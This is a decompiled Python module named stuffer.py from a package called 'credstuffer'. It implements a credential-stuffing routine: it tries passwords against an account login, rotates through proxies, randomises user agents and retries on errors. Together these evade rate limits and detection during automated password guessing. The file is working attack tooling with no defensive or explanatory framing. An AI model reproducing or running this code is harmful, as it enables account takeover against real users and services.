# uncompyle6 version 3.6.7
# Python bytecode 3.6 (3379)
# Decompiled from: Python 3.8.2 (tags/v3.8.2:7b3ab59, Feb 25 2020, 23:03:10) [MSC v.1916 64 bit (AMD64)]
# Embedded file name: build/bdist.linux-x86_64/egg/credstuffer/stuffer.py
# Compiled at: 2020-03-26 15:36:27
# Size of source mod 2**32: 1931 bytes
import logging
from time import sleep
from credstuffer.proxy import Proxy
from credstuffer.exceptions import ProxyMaxRequestError, ProxyBadConnectionError, InternetConnectionError

class Stuffer:
    """Stuffer"""

    def __init__(self, account, timeout_ms=50):
        self.logger = logging.getLogger('credstuffer')
        self.logger.info('Create class Stuffer')
        self.account = account
        self.proxy = Proxy(timeout_ms=timeout_ms)

    def set_account_proxy(self):
        """ sets a proxy for the given account

        :param account: account instance
        """
        proxy_alive = False
        while not proxy_alive:
            proxy = self._Stuffer__get_proxy_dict()
            if self.account.is_proxy_alive(proxy=proxy):
                self.account.set_proxy(proxy=proxy)
                self.account.set_random_user_agent()
                proxy_alive = True

    def account_login(self, password):
        """ executes the account login with given password

        """
        try:
            self.account.login(password)
        except (ProxyMaxRequestError, ProxyBadConnectionError) as ex:
            self.logger.error('ProxyError: {}'.format(ex))
            self.set_account_proxy()
            self.account_login(password=password)
        except InternetConnectionError as ex:
            self.logger.error('No Internet Connection: {}'.format(ex))
            sleep(10)
            self.account_login(password=password)

    def __get_proxy_dict(self):
        """ get proxy dictionary

        :return: dict with 'http' proxy
        """
        proxy = self.proxy.get()
        http_proxy = proxy
        https_proxy = proxy
        return {'http': http_proxy}